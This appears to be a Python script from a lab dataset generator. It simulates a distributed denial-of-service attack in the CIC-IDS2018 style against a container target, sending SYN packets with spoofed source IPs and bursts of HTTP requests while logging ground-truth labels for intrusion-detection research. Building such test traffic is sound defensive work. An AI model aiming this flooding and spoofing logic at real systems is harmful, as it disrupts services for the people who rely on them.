"""Distributed DoS: orchestrates the same attack from multiple attacker
containers simultaneously.

CIC-IDS2018 category: DDoS.
This script is designed to run on a single container but simulate
distributed traffic by spoofing source IPs from the attacker pool.
Each iteration sends to the target from a random attacker IP within
the 172.28.0.0/24 subnet.
"""

from __future__ import annotations

import os
import random
import signal
import sys
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.tests.packet_utils import build_syn_packet, send_raw_packet
from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True
ATTACKER_IPS = [
    "172.28.0.11",
    "172.28.0.12",
    "172.28.0.13",
    "172.28.0.14",
    "172.28.0.15",
]


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity  # packets per second total

    log_path = f"/app/logs/ddos_{attacker_ip}.csv"
    print(f"[ddos] Target: {target_ip}, Attacker: {attacker_ip}")
    print(f"[ddos] Duration: {duration}s, Rate: {intensity} pps")

    if not wait_for_target(target_ip, 8080):
        print("[ddos] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="ddos") as logger:
        count = 0
        end_time = time.time() + duration
        delay = 1.0 / max(intensity, 1)

        while RUNNING and time.time() < end_time:
            src_ip = random.choice(ATTACKER_IPS)
            attack_style = random.choice(["syn", "http"])

            if attack_style == "syn":
                pkt = build_syn_packet(target_ip, 8080, src_ip=src_ip)
                send_raw_packet(pkt)
            else:
                try:
                    requests.get(f"http://{target_ip}:8080/", timeout=1)
                except requests.RequestException:
                    pass

            count += 1
            if count % 100 == 0:
                logger.log(
                    src_ip=src_ip,
                    dst_ip=target_ip,
                    dst_port=8080,
                    label="ddos",
                    extra=f"count={count},style={attack_style}",
                )
            time.sleep(delay)

    print(f"[ddos] Completed. Sent {count} packets from distributed sources.")


if __name__ == "__main__":
    main()
